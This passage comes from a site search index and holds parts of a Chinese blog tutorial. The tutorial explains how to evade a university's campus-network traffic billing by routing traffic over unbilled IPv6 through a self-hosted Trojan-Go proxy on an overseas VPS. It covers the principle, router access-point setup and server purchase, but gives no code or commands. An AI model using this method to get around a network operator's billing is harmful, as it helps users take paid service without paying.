\u8d26\u53f7\u53ca\u5176\u652f\u4ed8\u65b9\u5f0f\uff08\u5bf9\u4e8eiOS/iPad OS\u7528\u6237\uff09</li> </ul> <p>\u5982\u679c\u4f60\u662f\u4ece\u96f6\u5f00\u59cb\u81ea\u5efa\uff0c\u90a3\u4f60\u8fd8\u9700\u8981\uff1a</p> <ul> <li> \u4e00\u53f0\u4e91\u670d\u52a1\u5668</li> <li> \u4e00\u4e2a\u57df\u540d\u4ee5\u53ca\u8be5\u57df\u540d\u5bf9\u5e94\u7684\u8bc1\u4e66</li> </ul> <p>\u6211\u5047\u8bbe\u4f60\u5df2\u7ecf\uff1a</p> <ul> <li> \u4e86\u89e3\u57fa\u672c\u7684 Linux \u64cd\u4f5c\u77e5\u8bc6\uff08\u4e0d\u81ea\u5efa\u6216\u8005\u7528 Windows \u81ea\u5efa\u7684\u53ef\u65e0\u89c6\uff09</li> <li> \u4e86\u89e3\u57fa\u672c\u7684\u642d\u5efa\u7f51\u7ad9\u7684\u57fa\u672c\u6d41\u7a0b</li> <li> \u4e86\u89e3\u57fa\u672c\u7684\u8ba1\u7b97\u673a\u7f51\u7edc\u57fa\u7840\u77e5\u8bc6\u53ca\u5176\u5e38\u89c1\u82f1\u8bed\u540d\u8bcd\u91ca\u4e49</li> <li> \u4e86\u89e3\u57fa\u672c\u7684 GitHub \u4f7f\u7528\u65b9\u6cd5</li> <li> \u62e5\u6709 CET4 \u8bc1\u4e66\uff0c\u5e76\u4e14\u7b14\u8bd5\u6210\u7ee9\u81f3\u5c11\u4e3a 425 \u5206\uff08\u6216\u5728\u5176\u4ed6\u6d4b\u8bd5\u4e2d\u53d6\u5f97\u540c\u7b49\u6548\u529b\u7684\u6210\u7ee9\uff09</li> </ul> <p>\u5728\u9605\u8bfb\u4ee5\u4e0b\u6559\u7a0b\u4e4b\u524d...</p> <ul> <li>\u5982\u679c\u6709\u56fe\uff0c\u8bf7\u4e0d\u8981\u76f4\u63a5\u7167\u7740\u56fe\u6284\uff0c\u53ef\u80fd\u4f1a\u6709\u5c0f\u6539\u7684\u5730\u65b9\u3002</li> <li>\u5982\u679c\u6709\u4ee3\u7801\uff0c\u8bf7\u4e0d\u8981\u76f4\u63a5\u7167\u7740\u4ee3\u7801\u6284\uff0c\u53ef\u80fd\u4f1a\u6709\u5c0f\u6539\u7684\u5730\u65b9\u3002</li> </ul>","tags":["ipv6","nginx","proxy","certbot"]},{"location":"blog/2022/220602-ipv6-bypass-billing-system/#12","title":"1.2 \u539f\u7406","text":"<p>\u7b2c\u4e8c\u4ee3\u4e2d\u56fd\u6559\u80b2\u548c\u79d1\u7814\u8ba1\u7b97\u673a\u7f51\uff08CERNET2\uff0c\u4fd7\u79f0\u6559\u80b2\u7f51\u6216\u4e8c\u4ee3\u6559\u80b2\u7f51\uff09\uff0c\u91c7\u7528\u4e3b\u5e72\u7f51\u548c\u7528\u6237\u7f51\u4e8c\u7ea7\u7ed3\u6784\uff0c\u4e3b\u5e72\u7f51\u91c7\u7528\u7eaf IPv6 \u534f\u8bae\uff0c\u4e5f\u662f\u4e2d\u56fd\u7b2c\u4e00\u4e2a IPv6 \u56fd\u5bb6\u4e3b\u5e72\u7f51\u3002\u76ee\u524d\u4f17\u591a\u9ad8\u6821\u90fd\u5df2\u7ecf\u63a5\u5165\u4e86 CERNET2 \u4e3b\u5e72\u7f51\u3002</p> <p>\u5728\u5927\u90e8\u5206\u9ad8\u6821\u4e2d\uff0c\u91c7\u7528\u7684\u662f Dr.COM\uff08\u57ce\u5e02\u70ed\u70b9\uff09\u8ba4\u8bc1\u7cfb\u7edf\u3002\u7531\u4e8e\u76ee\u524d\u8be5\u7cfb\u7edf\u5c1a\u4e0d\u8ba1\u5165 IPv6 \u7684\u6d41\u91cf\uff0c\u800c\u4e14 CERNET2 \u4e3b\u5e72\u7f51\u521a\u597d\u662f\u7eaf IPv6 \u7f51\u7edc\uff0c\u56e0\u6b64\u53ef\u4ee5\u901a\u8fc7 CERNET2 \u8fde\u63a5\u5230\u4ee3\u7406\u670d\u52a1\u5668\uff08Proxy Server\uff09\uff0c\u7528\u8fd9\u4e2a\u670d\u52a1\u5668\u4ee3\u7406\u6211\u4eec\u6240\u6709\u7684\u6d41\u91cf\uff0c\u5b9e\u73b0\u7ed5\u8fc7\uff08Bypass\uff09\u6821\u56ed\u7f51\u8ba1\u8d39\u7cfb\u7edf\u3002</p> <p>\u4e8b\u5b9e\u4e0a\uff0c\u5982\u679c\u4f60\u4e0d\u4f7f\u7528\u4ee3\u7406\u670d\u52a1\u5668\uff0c\u800c\u4f60\u8bbf\u95ee\u7684\u7f51\u7ad9\u662f\u7eaf IPv6 \u7f51\u7ad9\u7684\u8bdd\uff0c\u540c\u6837\u4e5f\u4e0d\u4f1a\u88ab\u6821\u56ed\u7f51\u8ba1\u8d39\u7cfb\u7edf\u6536\u53d6\u6d41\u91cf\u8d39\u3002\u5982\u56fe\uff1a</p> <pre><code>graph LR\n\n    You[\u4f60] --&gt; Gateway{\u7f51\u5173}\n    Gateway --&gt;|IPv4| Billing[\u6821\u56ed\u7f51\u8ba1\u8d39\u7cfb\u7edf]\n    Gateway ==&gt;|IPv6| Proxy[\u4ee3\u7406\u670d\u52a1\u5668]\n    Gateway --&gt;|IPv6| Internet[\u6821\u5916\u7f51\u7edc]\n    Proxy ==&gt;|IPv4 \u6216 IPv6| Internet\n    Billing --&gt;|IPv4| Internet\n</code></pre> <p>\u8bf4\u5f97\u901a\u4fd7\u70b9\uff0c\u6211\u4eec\u8981\u901a\u8fc7\u6821\u56ed\u7f51\u8bbf\u95ee\u67d0\u4e2a\u7f51\u7ad9\uff0c\u4f1a\u5148\u628a\u201c\u6211\u8981\u8bbf\u95ee\u67d0\u4e2a\u7f51\u7ad9\u201d\u8fd9\u4e2a\u8bf7\u6c42\uff08Request\uff09\u901a\u8fc7 IPv6 \u53d1\u5f80\u4ee3\u7406\u670d\u52a1\u5668\uff0c\u7531\u4ee3\u7406\u670d\u52a1\u5668\u4ee3\u66ff\u6211\u4eec\u5b8c\u6210\u8fd9\u4e2a\u8bf7\u6c42\u3002\u4ee3\u7406\u670d\u52a1\u5668\u5b8c\u6210 <code>\u6211\u8981\u8bbf\u95ee\u67d0\u4e2a\u7f51\u7ad9</code> \u7684\u8bf7\u6c42\u4e4b\u540e\u4f1a\u5f97\u5230\u7f51\u7ad9\u7684\u4e00\u4e2a\u54cd\u5e94\uff08Response\uff09\uff0c\u5b83\u518d\u5c06\u8fd9\u4e2a\u54cd\u5e94\u901a\u8fc7 IPv6 \u53d1\u56de\u6211\u4eec\u7684\u8bbe\u5907\u3002</p> <p>\u5bf9\u6821\u56ed\u7f51\u800c\u8a00\uff0c\u901a\u4fe1\u5168\u7a0b\u662f\u9760 IPv6 \u5b9e\u73b0\u7684\uff0c\u56e0\u6b64\u4e0d\u4f1a\u88ab\u6821\u56ed\u7f51\u7cfb\u7edf\u8ba1\u8d39\u3002\u6211\u4eec\u6ca1\u6709\u88ab\u6821\u56ed\u7f51\u7cfb\u7edf\u8ba1\u8d39\u5c31\u5b9e\u73b0\u4e86\u5bf9\u67d0\u4e2a\u7f51\u7ad9\u7684\u8bbf\u95ee\uff0c\u56e0\u6b64\u5bf9\u6211\u4eec\u8bbe\u5907\u800c\u8a00\uff0c\u5c31\u5b9e\u73b0\u4e86\u514d\u6d41\u8bbf\u95ee\u3002</p> <p>\u4ee5\u4e2d\u56fd\u6c11\u822a\u5927\u5b66\uff08CAUC\uff09\u4e3a\u4f8b\uff0c\u5176\u5df2\u7ecf\u63a5\u5165\u4e86 CERNET2\uff0c\u4e0e\u5929\u6d25\u97f3\u4e50\u5b66\u9662\u3001\u5929\u6d25\u4e2d\u533b\u836f\u5927\u5b66\u7b49\u9ad8\u6821\u5171\u4eab\u5e26\u5bbd\uff08\u4e0d\u8fc7\u597d\u50cf\u662f\u521d\u4ee3 CERNET\uff1f\uff09\u3002\u6821\u5185\u91c7\u7528 Dr.COM \u57ce\u5e02\u70ed\u70b9\u8ba1\u8d39\u7cfb\u7edf\uff0c\u6821\u56ed\u7f51\u8ba1\u8d39\u4ef7\u683c\u4e3a\u4ec5\u6309\u6d41\u91cf\u8ba1\u8d39\uff0c\u4ef7\u683c\u4e3a 0.5 \u5143/GB\u3002\u56e0\u5176\u4e0d\u5408\u7406\u7684\u4ef7\u683c \uff08\u751a\u81f3\u6709\u4f20\u8bf4\u8bf4\u4e2d\u56fd\u6c11\u822a\u5927\u5b66\u7684\u6821\u56ed\u7f51\u662f\u767d\u5ad6\u7684\u522b\u4eba\u9ad8\u6821\uff08\u7591\u4f3c\u5317\u4eac\u5927\u5b66\uff1f\uff09\u7684\u5269\u4f59\u5e26\u5bbd\uff0c\u4f60\u767d\u5ad6\u8fd9\u8fd8\u5411\u5b66\u751f\u6536\u8d39\uff0c\u8fd9\u6211\u4e0d\u80fd\u5fcd\uff09 \u6211\u4eec\u51b3\u5b9a\u8bbe\u6cd5\u7ed5\u8fc7\u5176\u8ba1\u8d39\u7cfb\u7edf\u3002</p> <p>\u6821\u56ed\u7f51\u6d41\u91cf\u5355\u4ef7\u53d8\u66f4\u5386\u53f2</p> <p>\u6839\u636e \u201c\u822a\u5927\u4fe1\u606f\u7f51\u7edc\" \u516c\u4f17\u53f7\uff0c\u4ece 2021 \u5e74 4 \u6708 28 \u65e5\u8d77\uff0c\u6821\u56ed\u7f51\u8ba1\u8d39\u6807\u51c6\u4ece 1 \u5143/GB \u4e0b\u8c03\u81f3 0.5 \u5143/GB\u3002</p> <p>2022 \u5e74 4 \u6708 1 \u65e5\uff0c\u6821\u56ed\u7f51\u8ba1\u8d39\u6807\u51c6\u518d\u6b21\u53d1\u751f\u53d8\u52a8\uff0c\u6559\u5b66\u529e\u516c\u533a\u57df\uff08\u5982\u6559\u5ba4\u3001\u529e\u516c\u5ba4\u3001\u56fe\u4e66\u9986\uff09\u6d41\u91cf\u5355\u4ef7\u53d8\u66f4\u4e3a 0.25 \u5143/GB\uff0c\u5176\u4ed6\u533a\u57df\u6d41\u91cf\u5355\u4ef7\u4fdd\u6301 0.5 \u5143/GB \u4e0d\u53d8\u3002</p> \u5173\u4e8e\u6821\u56ed\u7f51\u8ba1\u8d39\u7b56\u7565\u8c03\u6574\u7684\u901a\u77e5\uff08\u9ad8\u8840\u538b\uff0c\u614e\u70b9\u5f00\uff09 <p>\u5173\u4e8e\u6821\u56ed\u7f51\u8ba1\u8d39\u7b56\u7565\u8c03\u6574\u7684\u901a\u77e5</p> <p>\u5404\u4f4d\u6821\u56ed\u7f51\u7528\u6237\uff1a</p> <p>\u4e3a\u66f4\u597d\u652f\u6491\u5b66\u6821\u7684\u6559\u5b66\u3001\u79d1\u7814\u3001\u7ba1\u7406\u3001\u670d\u52a1\u5de5\u4f5c\uff0c\u901a\u8fc7\u5bf9\u90e8\u5206\u9ad8\u6821\u7f51\u7edc\u6536\u8d39\u6807\u51c6\u8c03\u7814\uff0c\u7ed3\u5408\u6211\u6821\u5b9e\u9645\u60c5\u51b5\uff0c\u6309\u7167\u6821\u56ed\u7f51\u6536\u8d39\u5bf9\u5b66\u751f\u9010\u5e74\u964d\u4f4e\uff0c\u6536\u8d39\u6807\u51c6\u4e0d\u9ad8\u4e8e\u5929\u6d25\u5e02\u5176\u4ed6\u9ad8\u6821\u5e73\u5747\u6c34\u5e73\u7684\u603b\u539f\u5219\u3002\u7ecf\u5b66\u6821\u5ba1\u6279\uff0c\u5bf9\u6821\u56ed\u7f51\u8ba1\u8d39\u7b56\u7565\u8fdb\u884c\u5982\u4e0b\u8c03\u6574\uff1a</p> <ul> <li>\u75ab\u60c5\u9632\u63a7\u671f\u95f4\uff0c\u5168\u4f53\u6559\u804c\u5de5\u548c\u5b66\u751f\u6bcf\u4eba\u6bcf\u6708 60 GB \u514d\u8d39\u4e0a\u7f51\u6d41\u91cf\uff0c\u672c\u6708\u5f00\u59cb\u6267\u884c\uff0c\u6062\u590d\u5e38\u6001\u6559\u5b66\u6a21\u5f0f\u540e\u7ed3\u675f\uff0c\u514d\u8d39\u6d41\u91cf\u5f53\u6708\u6709\u6548\uff0c\u672c\u6708\u5df2\u53d1\u653e\u3002</li> <li>\u6062\u590d\u5e38\u6001\u6559\u5b66\u6a21\u5f0f\u540e\uff0c\u6559\u804c\u5de5\u6bcf\u4eba\u6bcf\u6708 40 GB \u514d\u8d39\u4e0a\u7f51\u6d41\u91cf\uff0c\u5b66\u751f\u6bcf\u4eba\u6bcf\u6708 10 GB \u514d\u8d39\u4e0a\u7f51\u6d41\u91cf\uff0c\u514d\u8d39\u6d41\u91cf\u5f53\u6708\u6709\u6548\u3002</li> <li>\u81ea 4 \u6708 1 \u65e5\u8d77\uff0c\u6559\u804c\u5de5\u53ca\u5b66\u751f\u8d85\u51fa\u514d\u8d39\u6d41\u91cf\uff0c\u4f7f\u7528\u6559\u5b66\u533a\u3001\u529e\u516c\u533a\u7b49\u975e\u5b66\u751f\u5bbf\u820d\u7684\u65e0\u7ebf\u6821\u56ed\u7f51\uff0c\u6309\u7167\u73b0\u884c\u7f51\u7edc\u6536\u8d39\u6807\u51c6\u7684\u4e00\u534a\uff0c\u5373 0.25 \u5143/GB \u8ba1\u8d39\u3002</li> <li>\u6559\u804c\u5de5\u53ca\u5b66\u751f\u8d85\u51fa\u514d\u8d39\u6d41\u91cf\uff0c\u4f7f\u7528\u5168\u6821\u8303\u56f4\u6709\u7ebf\u7f51\u7edc\u53ca\u5b66\u751f\u5bbf\u820d\u7684\u65e0\u7ebf\u6821\u56ed\u7f51\uff0c\u4ecd\u6309\u73b0\u884c\u6807\u51c6 0.5 \u5143/GB \u6536\u8d39\u3002</li> <li>\u6821\u5185\u8d44\u6e90\u3001\u6821\u5916 IPv6 \u8d44\u6e90\u53ca\u5df2\u7533\u8bf7\u76f4\u901a\u7684\u6821\u5916\u6559\u5b66\u8d44\u6e90\u4ecd\u514d\u8ba1\u8d39\u3002</li> </ul> <p>\u4fe1\u606f\u7f51\u7edc\u4e2d\u5fc3</p> <p>2022 \u5e74 3 \u6708 23 \u65e5</p> <p>\u672c\u6587\u4ecb\u7ecd\u7684\u662f\u901a\u8fc7 Trojan-Go \u6765\u5b9e\u73b0\u7f51\u7edc\u4ee3\u7406\uff0c\u56e0\u4e3a\u5176\u642d\u5efa\u4ee3\u7406\u670d\u52a1\u5668\u7684\u53ef\u9760\u6027\u5f88\u9ad8\uff0c\u4e0d\u5bb9\u6613\u88ab\u53d1\u73b0\u3002\u5b9e\u9645\u4e0a\u4f60\u53ef\u4ee5\u91c7\u7528\u4efb\u4f55\u7684\u4ee3\u7406\u5f62\u5f0f\uff0c\u4e0d\u5c40\u9650\u4e8e Trojan-Go\u3002\u81f3\u4e8e\u5176\u4ed6\u7684\u4ee3\u7406\u5f62\u5f0f\uff0c\u8bf7\u81ea\u884c\u4e86\u89e3\uff0c\u672c\u6587\u4e0d\u8ba8\u8bba\u3002</p>","tags":["ipv6","nginx","proxy","certbot"]},{"location":"blog/2022/220602-ipv6-bypass-billing-system/#13-ipv6","title":"1.3 IPv6 \u73af\u5883","text":"<p>\u4f60\u9996\u5148\u9700\u8981\u4e00\u4e2a\u5b8c\u5168\u7684\u516c\u7f51 IPv6 \u8bbf\u95ee\u6743\u9650\u3002\u5bf9\u4e8e\u4e2d\u56fd\u6c11\u822a\u5927\u5b66\u6821\u5185\u5b66\u751f\u800c\u8a00\uff0c\u8bf7\u5148\u767b\u5f55\u6821\u56ed\u7f51\u540e\u518d\u7ee7\u7eed\u4e0b\u4e00\u6b65\u3002</p> <p>\u8bf7\u8bbf\u95ee https://www.test-ipv6.com/ \uff0c\u5e76\u68c0\u67e5 <code>\u4f60\u7684\u516c\u7f51IPv6\u5730\u5740\u662f</code> \u8fd9\u4e00\u9879\u662f\u5426\u6709 IPv6 \u5730\u5740\u3002</p> <p></p> <p>\u5982\u679c\u6709\uff0c\u90a3\u5c31\u53ef\u4ee5\u76f4\u63a5\u8fdb\u5165 \u7b2c 2 \u7ae0\u3002</p> <p>\u5982\u679c\u6ca1\u6709\uff0c\u8bf7\u5148\u5c1d\u8bd5\u591a\u6b21\u5237\u65b0\uff0c\u5982\u679c\u4e0d\u884c\uff0c\u90a3\u5c31\u6362\u4e00\u4e2a\u8fde\u63a5\u6821\u56ed\u7f51\u7684\u65b9\u6cd5\uff0c\u5c24\u5176\u662f\u5728\u5bbf\u820d\u4f7f\u7528\u8def\u7531\u5668\u7684\u60c5\u51b5\u3002\u5bf9\u4e8e\u4e00\u4e9b\u843d\u540e\u7684\u65e0\u7ebf\u8def\u7531\u5668\uff0c\u5176 NAT\uff08\u7f51\u7edc\u5730\u5740\u8f6c\u6362\uff09\u5e76\u4e0d\u63d0\u4f9b\u5bf9 IPv6 \u7684\u652f\u6301\uff0c\u4f60\u9700\u8981\u81ea\u5df1\u4e86\u89e3\u81ea\u5df1\u7684\u8def\u7531\u5668\u662f\u5426\u652f\u6301\u3002</p> <p>\u5373\u4fbf\u662f\u5bf9\u4e8e\u8fd9\u79cd\u5df2\u8fc7\u65f6\u7684\u8def\u7531\u5668\uff0c\u6211\u4eec\u4e5f\u662f\u6709\u4e00\u4e2a\u901a\u7528\u529e\u6cd5\u53ef\u4ee5\u89e3\u51b3\u7684\uff0c\u90a3\u5c31\u662f\u5c06\u8def\u7531\u5668\u4ee5\u63a5\u5165\u70b9\u6a21\u5f0f\u8fd0\u884c\u3002</p> \u5982\u4f55\u5c06\u8def\u7531\u5668\u4ee5\u63a5\u5165\u70b9\u6a21\u5f0f\u8fd0\u884c <ul> <li>\u5c06\u63d2\u5165\u8def\u7531\u5668 WAN \u63a5\u53e3\u7684\u7f51\u7ebf\u62d4\u51fa\uff0c\u7136\u540e\u63d2\u5165\u4efb\u610f\u4e00\u4e2a LAN \u63a5\u53e3\u3002</li> </ul> <p></p> <ul> <li>\u5173\u95ed\u8def\u7531\u5668\u7684 DHCP \u529f\u80fd\u3002\uff08\u5fc5\u987b\u5173\u95ed\uff0c\u5426\u5219\u4f60\u7684\u8def\u7531\u5668\u4f1a\u5bf9\u5ba2\u6237\u7aef\u5206\u914d\u9519\u8bef\u7684 IP \u5730\u5740\uff09</li> </ul> <p></p> <ul> <li>\u5c06\u8def\u7531\u5668 LAN \u53e3\u5730\u5740\u6539\u4e3a\u548c\u4e0a\u4e00\u7ea7\u7f51\u7edc\u8bbe\u5907\u5728\u540c\u4e00\u7f51\u6bb5\u4f46\u4e0d\u51b2\u7a81\u3002\uff08\u53ef\u9009\uff0c\u5982\u679c\u4f60\u770b\u4e0d\u61c2\u8fd9\u53e5\u8bdd\u4ec0\u4e48\u610f\u601d\u53ef\u4ee5\u8df3\u8fc7\uff09</li> </ul> <p></p> <ul> <li>\u91cd\u542f\u8def\u7531\u5668\u3002</li> </ul> <p>\u5173\u4e8e\u5982\u4f55\u5c06\u8def\u7531\u5668\u4ee5\u63a5\u5165\u70b9\u6a21\u5f0f\u8fd0\u884c\uff0c\u4f60\u4e5f\u53ef\u4ee5\u53c2\u8003\u5176\u4ed6\u7684\u8d44\u6599\uff1a</p> <ul> <li>[\u4f20\u7edf\u754c\u9762\u8def\u7531\u5668] \u5f53\u65e0\u7ebfAP\uff08\u65e0\u7ebf\u4ea4\u6362\u673a\uff09\u4f7f\u7528\uff0c\u600e\u4e48\u8bbe\u7f6e\uff1f</li> <li>\u65e0\u7ebf\u8def\u7531\u5668\u662f\u5426\u53ef\u4ee5\u4f5c\u4e3a\u65e0\u7ebf\u4ea4\u6362\u673a\u4f7f\u7528\uff1f</li> <li>\u8def\u7531\u5668 AP\u3001\u8def\u7531\u3001\u4e2d\u7ee7\u3001\u6865\u63a5\u6a21\u5f0f\u7684\u533a\u522b</li> </ul>","tags":["ipv6","nginx","proxy","certbot"]},{"location":"blog/2022/220602-ipv6-bypass-billing-system/#2","title":"\u7b2c 2 \u7ae0 \u4ee3\u7406\u670d\u52a1\u5668\u7684\u642d\u5efa","text":"<p>\u5982\u679c\u4f60\u7684\u540c\u5b66\u6709\u6309\u7167\u6b64\u6559\u7a0b\u642d\u5efa\u7684\u73b0\u6210\u7684\u514d\u6d41\u670d\u52a1\u5668\uff0c\u90a3\u4f60\u53ef\u4ee5\u76f4\u63a5\u8df3\u5230 3.3 \u914d\u7f6e\u5ba2\u6237\u7aef\uff08Client\uff09\uff0c\u5e76\u5411\u4ed6\u4eec\u8be2\u95ee\u76f8\u5173\u7684\u914d\u7f6e\u65b9\u6cd5\u3002\u5982\u679c\u4f60\u60f3\u81ea\u884c\u642d\u5efa\uff0c\u8bf7\u7ee7\u7eed\u770b\u672c\u7ae0\u3002</p>","tags":["ipv6","nginx","proxy","certbot"]},{"location":"blog/2022/220602-ipv6-bypass-billing-system/#21","title":"2.1 \u8d2d\u4e70\u4ee3\u7406\u670d\u52a1\u5668","text":"<p>\u4ece\u73b0\u5728\u5f00\u59cb\uff0c\u6211\u5df2\u7ecf\u8ba4\u4e3a\u4f60\u62e5\u6709\u4e86\u5b8c\u5168\u7684 IPv6 \u8bbf\u95ee\u6743\u9650\u3002</p> <p>\u63a5\u4e0b\u6765\u4f60\u9700\u8981\u4e00\u4e2a\u540c\u65f6\u62e5\u6709 IPv6 \u72ec\u7acb\u5730\u5740\u548c IPv4 \u72ec\u7acb\u5730\u5740\u7684\u670d\u52a1\u5668\uff08\u5373 \u53cc\u6808 \u670d\u52a1\u5668\uff09\uff0c\u4e00\u822c\u6765\u8bf4\u968f\u4fbf\u5230\u54ea\u4e2a\u4e91\u670d\u52a1\u5546\uff08\u963f\u91cc\u4e91\u3001\u817e\u8baf\u4e91 \u4e4b\u7c7b\u7684\uff09\u4e70\u4e00\u4e2a\u5c31\u884c\u3002\u8fd9\u91cc\u4e0d\u63d0\u4f9b\u8d2d\u4e70\u65b9\u6cd5\uff08\u56e0\u4e3a\u5f88\u7b80\u5355\uff0c\u201c\u5c31\u50cf\u4f60\u6dd8\u5b9d\u4e70\u4e1c\u897f\u4e00\u6837\u201d\u2014\u2014\u963f\u91cc\u4e91\u8bf4\u7684\uff09\uff0c\u8fd9\u91cc\u53ea\u58f0\u660e\u4e00\u4e0b\u8d2d\u4e70\u7684\u6ce8\u610f\u4e8b\u9879\u3002</p> <p>\u7cfb\u7edf Linux\u3001Windows \u5747\u53ef\uff0c\u4f46\u8bf7\u4e0d\u8981\u4f7f\u7528 <code>\u5e94\u7528\u955c\u50cf</code> \u548c <code>\u5e94\u7528\u670d\u52a1\u5668</code>\u3002\u4e3e\u4e2a\u4f8b\u5b50\uff0c\u5982\u679c\u4f60\u7528\u7684\u662f\u963f\u91cc\u4e91\uff0c\u90a3\u4f60\u53ef\u4ee5\u9009\u62e9 <code>\u8f7b\u91cf\u5e94\u7528\u670d\u52a1\u5668\uff08VPS\uff09</code> \u6216\u8005 <code>\u4e91\u670d\u52a1\u5668\uff08ECS\uff09</code>\uff0c\u4e70\u7684\u65f6\u5019\u8bf7\u9009\u62e9 <code>\u7cfb\u7edf\u955c\u50cf</code> \u800c\u4e0d\u662f <code>\u5e94\u7528\u955c\u50cf</code>\u3002</p> <p>\u914d\u7f6e\u968f\u610f\uff0c\u4f60\u53ea\u9700\u8981\u6ce8\u610f\u7f51\u7edc\u65b9\u9762\u3002\u4f60\u9996\u5148\u8981\u6ce8\u610f\u7f51\u7edc\u6d41\u91cf\uff0c\u8fd9\u51b3\u5b9a\u4e86\u4f60\u6bcf\u4e2a\u6708\u53ef\u4ee5\u4ee3\u7406\u7684\u6d41\u91cf\u7684\u5927\u5c0f\uff08\u4e00\u822c\u4f60\u7528\u7684\u6d41\u91cf\u4f1a\u6bcf\u6708\u91cd\u7f6e\u4e00\u6b21\uff0c\u5c31\u50cf\u4f60\u7684\u624b\u673a\u4e00\u6837\uff09\uff0c\u4f46\u548c\u624b\u673a\u4e0d\u540c\u7684\u662f\uff0c\u8fd9\u4e2a\u6d41\u91cf\u4e00\u822c\u662f\u6307 <code>\u4e0a\u884c\u6d41\u91cf</code>\uff08\u5373\u670d\u52a1\u5668\u5bf9\u5916\u9762\u8f93\u51fa\u7684\u6d41\u91cf\uff09\u548c <code>\u4e0b\u884c\u6d41\u91cf</code> \u4e24\u8005\u7684\u6700\u5927\u503c\uff0c\u800c\u4e0d\u662f\u6307 <code>\u4e0a\u884c\u6d41\u91cf</code> \u548c <code>\u4e0b\u884c\u6d41\u91cf</code> \u7684\u603b\u548c\u3002\u4e8b\u5b9e\u4e0a\uff0c\u5bf9\u4e8e\u4ee3\u7406\u670d\u52a1\u5668\u800c\u8a00\uff0c\u4e0a\u884c\u6d41\u91cf\u51e0\u4e4e\u7b49\u4e8e\u4e0b\u884c\u6d41\u91cf\uff0c\u56e0\u6b64 <code>\u4e0a\u884c\u6d41\u91cf</code> \u548c <code>\u4e0b\u884c\u6d41\u91cf</code> \u5e76\u4e0d\u4f1a\u76f8\u5dee\u592a\u5927\u3002\u5176\u6b21\u4f60\u9700\u8981\u6ce8\u610f\u5e26\u5bbd\u5927\u5c0f\u3002\u4e0d\u8981\u770b\u9519\u5355\u4f4d\uff0c\u4e0d\u8981\u9519\u628a <code>Mbps</code> \u5f53\u4f5c <code>MB/s</code>\u3002\u6ca1\u5fc5\u8981\u9009\u62e9\u5f88\u5927\u7684\u5e26\u5bbd\uff0c\u4f60\u53ef\u4ee5\u6839\u636e\u4f60\u8bbe\u5907\u9009\u62e9\u5408\u9002\u7684\u5e26\u5bbd\uff08\u4e5f\u9700\u8981\u8003\u8651\u5230\u591a\u4e2a\u8bbe\u5907\u540c\u65f6\u4f7f\u7528\u514d\u6d41\u7684\u60c5\u51b5\uff09\u3002</p> <p>\u670d\u52a1\u5668\u5730\u7406\u5730\u5740\u8bf7\u5c3d\u91cf\u9009\u62e9\u5927\u9646\u4ee5\u5916\u7684\u670d\u52a1\u5668\uff0c\u539f\u56e0\u662f\u5927\u9646\u7684 IPv6 \u670d\u52a1\u5668\u4ef7\u683c\u592a\u8d35\uff0c\u5e76\u4e14\u4f7f\u7528\u5927\u9646\u670d\u52a1\u5668\u642d\u5efa\u7f51\u7ad9\u9700\u8981\u63d0\u524d\u5411\u5de5\u4fe1\u90e8\u5907\u6848\uff0c\u5e76\u4e14\u8981\u5728\u4e91\u670d\u52a1\u5668\u5546\u5904\u8fdb\u884c\u5b9e\u540d\u8ba4\u8bc1\uff0c\u5341\u5206\u9ebb\u70e6\u3002\u4f46\u540c\u65f6\u8bf7\u6ce8\u610f\uff0c\u4f7f\u7528\u5883\u5916\u670d\u52a1\u5668\u642d\u5efa\u4ee3\u7406\u670d\u52a1\u5668\uff0c\u5e76\u5411\u4e2d\u56fd\u5927\u9646\u63d0\u4f9b\u4ee3\u7406\u670d\u52a1\u662f\u8fdd\u6cd5\u884c\u4e3a\uff0c\u8bf7\u81ea\u884c\u659f\u914c\u3002</p> <p>\u672c\u4eba\u5efa\u8bae\u8d2d\u4e70 Vultr \u7684\u673a\u5668\uff0c\u4e00\u4e2a\u6708 $5 \u800c\u4e14\u514d\u8d39\u52a0 IPv6\uff0c\u4e0d\u50cf\u56fd\u5185\u67d0\u4e9b\u5783\u573e\u5c0f\u6c34\u7ba1\u670d\u52a1\u5668\uff0c\u52a0\u4e2a IPv6 \u5730\u5740\u8fd8\u8981\u989d\u5916\u4ea4\u51e0\u767e\u5757\u94b1\u667a\u5546\u7a0e\uff08\u4e0d\u70b9\u540d\u6279\u8bc4\uff09\u3002</p>","tags":["ipv6","nginx","proxy","certbot"]},{"location":"blog/2022/220602-ipv6-bypass-billing-system/#22-https","title":"2.2 \u642d\u5efa https \u7f51\u7ad9","text":"<p>\u5728\u8fdb\u884c\u4e0b\u4e00\u7ae0\u4e4b\u524d\uff0c\u4f60\u5fc5\u987b\u5148\u642d\u5efa\u4e00\u4e2a https \u7684\u7f51\u7ad9\u3002\u5982\u679c\u4f60\u5df2\u7ecf\u642d\u5efa\u597d\u4e86\u73b0\u6210\u7684 https \u7f51\u7ad9\uff0c\u8bf7\u76f4\u63a5\u8df3\u8fc7\u672c\u8282\u3002\u5982\u679c\u4f60\u53ea\u4f1a\u642d\u5efa http \u7f51\u7ad9\uff0c\u6216\u8005\u6709\u4e00\u4e2a\u73b0\u6210\u7684 http \u7f51\u7ad9\uff0c\u8bf7\u5feb\u8fdb\u5230 2.2.5 \u8bc1\u4e66\u914d\u7f6e \u90a3\u90e8\u5206\uff0c\u5426\u5219\u8bf7\u4e0d\u8981\u8df3\u8fc7\u4e0b\u9762\u7684\u5185\u5bb9\u3002</p> <p>\u4e00\u4e2a\u5b8c\u6574\u7684https\u7f51\u7ad9\u9700\u8981\u5982\u4e0b\u57fa\u7840\uff1a</p> <ul> <li>\u57df\u540d\uff08\u9700\u8981\u4ed8\u8d39\uff0c\u4f46\u8d2d\u4e70\u7b80\u5355\uff09</li> <li>DNS \u914d\u7f6e\uff08\u8f83\u4e3a\u7b80\u5355\uff09</li> <li>\u7f51\u7ad9\u5185\u5bb9\uff08\u8f83\u4e3a\u7b80\u5355\uff09</li> <li>nginx \u914d\u7f6e\uff08\u590d\u6742\uff09</li> <li>\u8bc1\u4e66\u914d\u7f6e\uff08\u8f83\u4e3a\u590d\u6742\uff09</li> </ul>","tags":["ipv6","nginx","proxy","certbot"]},{"location":"blog/2022/220602-ipv6-bypass-billing-system/#221","title":"2.2.1 